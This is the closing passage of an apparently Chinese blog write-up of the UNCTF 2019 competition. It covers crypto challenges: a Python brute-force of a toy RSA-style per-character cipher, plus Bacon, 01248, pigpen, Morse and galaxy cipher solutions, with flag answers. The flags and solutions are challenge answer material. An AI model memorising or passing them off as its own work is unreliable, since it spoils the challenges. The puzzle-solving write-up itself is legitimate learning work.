+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag = open('flag.txt','r').read()</span></span><br><span class="line"><span class="comment"># N = 221</span></span><br><span class="line"><span class="comment"># e = 5</span></span><br><span class="line"><span class="comment"># enc = b''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in flag:</span></span><br><span class="line"><span class="comment">#     enc += bytes([pow(ord(i),e,N)])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt = open('encrypt','wb')</span></span><br><span class="line"><span class="comment"># encrypt.write(enc)</span></span><br><span class="line"><span class="comment"># encrypt.close()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">	N=<span class="number">221</span></span><br><span class="line">	e=<span class="number">5</span></span><br><span class="line">	encrypt=open(<span class="string">'encrypt'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">	dic=<span class="string">'''1234567890~`!@#$%^&amp;*()_+-=[]&#123;&#125;;:'"|\,&lt;.&gt;/?qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP'''</span></span><br><span class="line">	flag=<span class="string">''</span></span><br><span class="line">	length=len(encrypt)</span><br><span class="line">	num=<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> encrypt:</span><br><span class="line">		j=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">			<span class="keyword">if</span>((pow(ord(dic[k]),e,N))==i):</span><br><span class="line">				flag+=dic[k]</span><br><span class="line">				j=<span class="number">1</span></span><br><span class="line">		num+=<span class="number">1</span></span><br><span class="line">	print(flag)</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>
+<p>执行得到flag<br><figure class="image-box">
+                <a rel=UNCTF wp href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<h2 id="bacon-100"><a href="#bacon-100" class="headerlink" title="bacon  100"></a>bacon  100</h2><p>放脚本里跑,第二种解密结果是对的</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./26.png" title="图片" data-fancybox="images"><img src="./26.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>md5后是  2b95d1f09b8b66c5c43622a4d9ec9a04</p>
+<h2 id="云深不知处-100"><a href="#云深不知处-100" class="headerlink" title="云深不知处 100"></a>云深不知处 100</h2><p>云影密码(01248),以0为间隔分割,每组数字相加对应的a-z字母,md5后为flag</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./27.png" title="图片" data-fancybox="images"><img src="./27.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="安妮起源-200"><a href="#安妮起源-200" class="headerlink" title="安妮起源  200"></a>安妮起源  200</h2><p>第一层选择愿意,解出猪圈密码:cubismine</p>
+<p>第二层是摩斯密码,解出:magicalmorsecode</p>
+<p>第三层是银河密码,解出:helloctfer</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./28.png" title="图片" data-fancybox="images"><img src="./28.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>F1ame_i5_My_f4vorite_t0y</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-20T12:59:17.477Z" itemprop="dateUpdated">2019-11-20 20:59:17</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/&title=《UNCTF wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/&title=《UNCTF wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/web学习/ckzc1g0yy0048qsucook4cudj/WEB-XML与XXE漏洞-伪协议/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">WEB XML与XXE漏洞(伪协议)</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/报错解决/ckzc1g0zg004wqsuc3lnrtumf/python2-7-ubuntu解决import-cv2问题/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">python2.7 ubuntu解决import cv2问题</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">1.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#checkinA-100"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">checkinA  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Simple-Calc-1-200"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Simple_Calc_1  200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Simple-Calc-2-400"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Simple_Calc_2  400</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上传给小姐姐的照片-100"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">上传给小姐姐的照片  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NSB-Login-200"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">NSB Login  200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB1-100"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">WEB1  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB2-100"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">WEB2  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NSB-Reset-Password-300"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">NSB Reset Password  300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#光坂镇的小诗1-100"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">光坂镇的小诗1  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#光坂镇的小诗2-200"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">光坂镇的小诗2  200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#阿风日记-docx-100"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">阿风日记.docx  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#easyphp-100"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">easyphp  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#这好像不是上传"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">这好像不是上传</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#快乐游戏题-100"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">快乐游戏题  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#亲爱的-100"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">亲爱的  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#长安十二时辰-200"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">长安十二时辰  200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#贝斯的图-100"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">贝斯的图  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#我的头怎么了-100"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">我的头怎么了  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#unctf-平淡日子下面的秘密-100"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">unctf_平淡日子下面的秘密  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#压缩大礼包-400"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">压缩大礼包  400</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RE"><span class="post-toc-number">3.</span> <span class="post-toc-text">RE</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">4.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nc-100"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">nc  100</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-number">5.</span> <span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BABYRSA-300"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">BABYRSA  300</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#bacon-100"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">bacon  100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#云深不知处-100"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">云深不知处 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#安妮起源-200"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">安妮起源  200</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://w4nder.top/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.vigorous.top/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.mklkx.xyz/" target="_blank">mklkx</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/cx1ng/" target="_blank">cxing</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2022
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/&title=《UNCTF wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckzc1g0yh003mqsucwt30q91b/UNCTF-wp/&title=《UNCTF wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACxElEQVR42u3awU7kMBAE0Pn/nwaJy3Igmaq2TVjp5TSC4PhlJLcp9+sVXx9f1/fP36/kb5M7k+e+Tlx4eHh4oyGurquhk9/e//xqulcj37/iyzHx8PDwjvHaYpA/4P7n7T35nPHw8PD+Ai9frPPikcwEDw8P7//lzUpCPtrsdePh4eE9xUsemUwoD3lXgoYjWQseHh5ezFs5iHrq8/HzPTw8PLzRqXpeBmaPT47HlqJkPDw8vAO8Nk7No9iVQDYZM48w8PDw8Pby8taoNnLNJzdr54o+4+Hh4R3gzZbylVaq9Uar+9lebqnx8PDwNvHauCEPDlaOzfIN+pv78fDw8A7wkknnxSOfUNtote1kDw8PD2+Zlyy4eczaNh/MSlFhwcPDwzvAWw9PZ+Fvu4a3r+PNN4mHh4e3wJst+u22u20jmI1web6Hh4eHd4w3C1VnDVKzkpA/vThJw8PDw9vKy6c7W9zz6DY/YIv+S8DDw8PbxMsLQPuYvMlgduj1plEADw8PbysvDx1a9mwpn7VeRUEzHh4e3iberPlptvQnZaCOG+5fAR4eHt4xXtvq9BFfOandfCd/i4eHh3eCtx4E7GovyLf1bUsWHh4e3l5esgnON7j50t9GDPmW/Ye6h4eHh7eVN9tMtwVj11FWHh8Xp3x4eHh4JS9vrsof3EYY+dFa/jXg4eHh/SYvn3RbJPKS0DZ4vQkj8PDw8Lby2qg0LxizVq38teLh4eE9xZtNcb1poA2CZ0UFDw8P7zRvZdKzkCIvAEUfRL77xsPDwxvxZmHBicOwtqjg4eHhPcur04syqlgfMykMl2UMDw8P7xivjWKTItHiV2pa1HqFh4eH9+u8POTNj742AO5Hw8PDw/sDvHxrm7cazO6MtuN4eHh4x3jJNrcNCNp7Zuw388TDw8M7wFs/AJt9nvEeON/Dw8PD+3d9AuGIFttk+XKfAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
